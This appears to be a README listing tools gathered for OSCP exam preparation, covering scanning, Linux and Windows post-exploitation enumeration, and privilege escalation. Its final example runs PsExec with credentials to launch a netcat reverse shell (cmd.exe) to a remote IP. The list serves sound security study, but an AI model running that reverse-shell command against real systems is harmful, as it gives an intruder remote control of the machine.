# GATHERED TOOLS THAT ARE USEFUL FOR OSCP !!



## Scanning

- nmapAutomator.sh

	- removed nikto and gobust parts, since sparta does nikto and i prefer to gobust separately, when needed.

from https://github.com/21y4d/nmapAutomator


## Post-Exploitation enums !~ !~ !!

### Linux

- linenum.sh

from rebootuser https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

- linuxprivchecker.py

from https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py

- unixprivchk.sh

from pentestmonkey

### Windows 

- Powerless.bat |  cmd shell enum (for scenarios without PowerShell)

from https://github.com/M4ximuss/Powerless

- windows-exploit-suggester.py

- windows-privesc-check2.exe

- accesschk5.2.exe |  backward compatible for use alongside fuzzy security's walkthrough


## Privilege escalation tools

### Windows

- PsExec.exe / PsExec64.exe |  to run with elevated accounts

	- eg  PsExec64.exe \\DOMAIN -u USERNAME -p PASSWORD nc.exe -e cmd.exe 10.11.0.106 80 

